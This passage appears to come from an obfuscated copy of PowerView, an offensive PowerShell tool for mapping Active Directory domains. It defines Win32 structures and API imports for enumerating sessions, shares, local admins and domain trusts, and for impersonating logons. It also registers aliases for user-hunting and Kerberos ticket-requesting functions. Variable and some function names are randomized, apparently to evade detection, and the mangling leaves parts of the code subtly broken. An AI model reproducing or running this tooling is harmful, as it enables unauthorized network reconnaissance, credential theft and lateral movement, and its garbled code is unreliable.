            $Qkx
        }
        }
    }
}











$KoGyNJfZxaLekAPu1g7zrX = New-InMemoryModule -UAjCZRTMswNEJi Win32




$JKQhSPcAIG = psenum $KoGyNJfZxaLekAPu1g7zrX PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}


$lDPecSvGL3yM6xw2 = psenum $KoGyNJfZxaLekAPu1g7zrX PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -7E1


$KLrjblEyzposuH = psenum $KoGyNJfZxaLekAPu1g7zrX PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -7E1


$VKw = psenum $KoGyNJfZxaLekAPu1g7zrX WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}


$AZy = struct $KoGyNJfZxaLekAPu1g7zrX PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $VKw
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}


$9noUdPiNJ = struct $KoGyNJfZxaLekAPu1g7zrX WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}


$G4fcROZ = struct $KoGyNJfZxaLekAPu1g7zrX PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}


$WLGzd3yQxk = struct $KoGyNJfZxaLekAPu1g7zrX PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}


$wmMIjOxaozAy4Gusyvn = struct $KoGyNJfZxaLekAPu1g7zrX PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}


$xEfliHLDtB3XmOjor7 = psenum $KoGyNJfZxaLekAPu1g7zrX SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}


$okIWA07EPwqZK = struct $KoGyNJfZxaLekAPu1g7zrX LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}


$K9eMnZdEG = struct $KoGyNJfZxaLekAPu1g7zrX LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $xEfliHLDtB3XmOjor7
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}


$eQlyLR32IiaJqE0bOk6GTVp = psenum $KoGyNJfZxaLekAPu1g7zrX DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -7E1
$MxiFs4rpVzeCV1bg4jBaVx = psenum $KoGyNJfZxaLekAPu1g7zrX DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$BmjwiR5h2ovQr7NEMcl1O0 = psenum $KoGyNJfZxaLekAPu1g7zrX DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}


$Zx6siTaGPK = struct $KoGyNJfZxaLekAPu1g7zrX DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $eQlyLR32IiaJqE0bOk6GTVp
    ParentIndex = field 3 UInt32
    TrustType = field 4 $MxiFs4rpVzeCV1bg4jBaVx
    TrustAttributes = field 5 $BmjwiR5h2ovQr7NEMcl1O0
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}


$a50S = struct $KoGyNJfZxaLekAPu1g7zrX NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}


$v = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($a50S, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$oX5dRThlEwa1c = $v | Add-Win32Type -Module $KoGyNJfZxaLekAPu1g7zrX -Namespace 'Win32'
$jmL9QM8qOyJ0k = $oX5dRThlEwa1c['netapi32']
$b8ZFNi9uGrz0TyhMxtc2s3R5Q = $oX5dRThlEwa1c['advapi32']
$jJ7mH9O0sX = $oX5dRThlEwa1c['wtsapi32']
$h7lPxhPwY20X = $oX5dRThlEwa1c['Mpr']
$G8R = $oX5dRThlEwa1c['kernel32']

Set-32MgN Get-IPAddress Resolve-IPAddress
Set-32MgN Convert-NameToSid ConvertTo-SID
Set-32MgN Convert-SidToName ConvertFrom-SID
Set-32MgN Request-SPNTicket Get-DomainSPNTicket
Set-32MgN Get-DNSZone Get-DomainDNSZone
Set-32MgN Get-ZKHt4xveu8MJ Get-DomainDNSRecord
Set-32MgN Get-NetDomain Get-3Ecdwi8qNy
Set-32MgN Get-NetDomainController Get-DomainController
Set-32MgN Get-NetForest Get-83xk0
Set-32MgN Get-NetForestDomain Get-ForestDomain
Set-32MgN Get-NetForestCatalog Get-ForestGlobalCatalog
Set-32MgN Get-NetUser Get-DomainUser
Set-32MgN Get-UserEvent Get-DomainUserEvent
Set-32MgN Get-NetComputer Get-DomainComputer
Set-32MgN Get-ADObject Get-DomainObject
Set-32MgN Set-ADObject Set-DomainObject
Set-32MgN Get-ObjectAcl Get-DomainObjectAcl
Set-32MgN Add-ObjectAcl Add-DomainObjectAcl
Set-32MgN Invoke-ACLScanner Find-InterestingDomainAcl
Set-32MgN Get-GUIDMap Get-DomainGUIDMap
Set-32MgN Get-NetOU Get-DomainOU
Set-32MgN Get-NetSite Get-DomainSite
Set-32MgN Get-NetSubnet Get-DomainSubnet
Set-32MgN Get-NetGroup Get-DomainGroup
Set-32MgN Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-32MgN Get-NetGroupMember Get-DomainGroupMember
Set-32MgN Get-NetFileServer Get-DomainFileServer
Set-32MgN Get-DFSshare Get-DomainDFSShare
Set-32MgN Get-NetGPO Get-DomainGPO
Set-32MgN Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-32MgN Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-32MgN Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-32MgN Get-LoggedOnLocal Get-RegLoggedOn
Set-32MgN Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-32MgN Get-M6Sb30DA Get-NetComputerSiteName
Set-32MgN Get-Proxy Get-WMIRegProxy
Set-32MgN Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-32MgN Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-32MgN Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-32MgN Get-NetProcess Get-WMIProcess
Set-32MgN Invoke-ThreadedFunction New-ThreadedFunction
Set-32MgN Invoke-UserHunter Find-DomainUserLocation
Set-32MgN Invoke-ProcessHunter Find-DomainProcess
Set-32MgN Invoke-EventHunter Find-DomainUserEvent
Set-32MgN Invoke-ShareFinder Find-DomainShare
Set-32MgN Invoke-FileFinder Find-InterestingDomainShareFile
Set-32MgN Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-32MgN Get-NetDomainTrust Get-DomainTrust
Set-32MgN Get-NetForestTrust Get-ForestTrust
Set-32MgN Find-ForeignUser Get-DomainForeignUser
Set-32MgN Find-ForeignGroup Get-DomainForeignGroupMember
Set-32MgN Invoke-MapDomainTrust Get-DomainTrustMapping
Set-32MgN Get-DomainPolicy Get-DomainPolicyData

